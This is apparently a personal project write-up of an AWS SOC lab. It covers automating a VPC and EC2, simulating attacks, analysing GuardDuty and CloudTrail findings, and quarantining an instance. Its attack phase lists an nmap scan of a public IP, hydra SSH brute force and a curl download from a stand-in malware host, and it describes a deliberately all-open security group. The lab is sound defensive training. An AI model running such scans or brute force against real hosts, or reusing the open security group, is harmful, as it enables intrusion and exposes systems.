# 🛡️ AWS Cloud SOC Lab: Simulating a Cloud Breach and Response

## 📌 Overview
This project is a hands-on simulation of a cloud security incident in AWS, built to practice infrastructure automation, attack simulation, and incident response. I automated the creation of an AWS environment, simulated malicious activity, detected threats with GuardDuty, and performed manual containment like a SOC analyst. All work was done in a fully isolated AWS environment using Kali Linux.

## 🎯 Project Goals
- Automate AWS infrastructure (VPC, EC2, security groups) using Python and Boto3.
- Simulate real-world attacks (port scans, SSH brute-force, fake malware downloads).
- Analyze GuardDuty findings and CloudTrail logs to extract IOCs.
- Practice SOC analyst tasks like quarantining compromised resources.

## ⚙️ Phases

### ✅ Phase 1: VPC Automation
- Created a custom VPC (`10.0.0.0/16`), subnets, Internet Gateway, and Route Table using Boto3.
- Used `config.py` for reusable variables.
- **Lesson:** Break scripts into steps and print IDs for easier debugging.

### ✅ Phase 2: Security Group Setup
- Created `coded-sg-v2` security group allowing all traffic (lab-only, insecure).
- Verified default VPC ID using AWS CLI.
- **Lesson:** Intentionally insecure setups maximize detection visibility.

### ✅ Phase 3: EC2 Attacker Setup
- Launched an Ubuntu EC2 instance (`t2.micro`, AMI: `ami-04b70fa74e45c3917`).
- Configured CloudWatch Agent via SSM Parameter Store to monitor logs (`/var/log/syslog`, `/var/log/auth.log`) and metrics.
- Installed tools like `nmap` and `curl` for attack simulation.
- **Lesson:** SSM-managed configs are scalable for monitoring.

### ✅ Phase 4: Attack Simulation
- Simulated:
  - Port scans: `nmap -sS 1.1.1.1`
  - SSH brute-force: `hydra`
  - Fake malware downloads: `curl http://badhost.com/malware`
- Triggered GuardDuty’s malware scan (`/aws/guardduty/malware-scan-events`).
- **Lesson:** Even failed commands can trigger behavioral detections.

### ✅ Phase 5: Forensics and IOC Extraction
- Analyzed GuardDuty findings:
  - `Recon:EC2/Portscan`
  - `Backdoor:EC2/DenialOfService.TorClient`
- Extracted IOCs like:
  - IP: `1.1.1.1`
  - Port: `35`
  - Instance ID: `i-0bca611a4c23538c8`
- Encountered CloudTrail permission issue (`cloudtrail:LookupEvents`).
- **Lesson:** IAM policies are critical gatekeepers.

### ✅ Phase 5.2: Manual Quarantine
- Tagged the compromised EC2 instance with `Quarantine=True`.
- Stopped the instance manually.
- **Lesson:** Manual containment builds IR muscle memory.

### ✅ Phase 6: CloudTrail Analysis
- Correlated GuardDuty findings with CloudTrail logs.
- Investigated snapshot usage and log activity.
- **Lesson:** Logs provide context for reconstructing incident timelines.

## 💡 Key Lessons
- Cloud security is tactical—requires real, hands-on AWS practice.
- GuardDuty + CloudTrail give powerful visibility into threat activity.
- Manual steps like tagging and stopping instances can be solid IR actions.
- IAM permissions control your ability to investigate—don’t overlook them.

🙋 Reflections
This project taught me how to think like a cloud security analyst—from building and misconfiguring infrastructure to simulating attacks and performing incident response. It’s a real-world, hands-on journey through AWS security tools like GuardDuty, CloudTrail, and IAM.

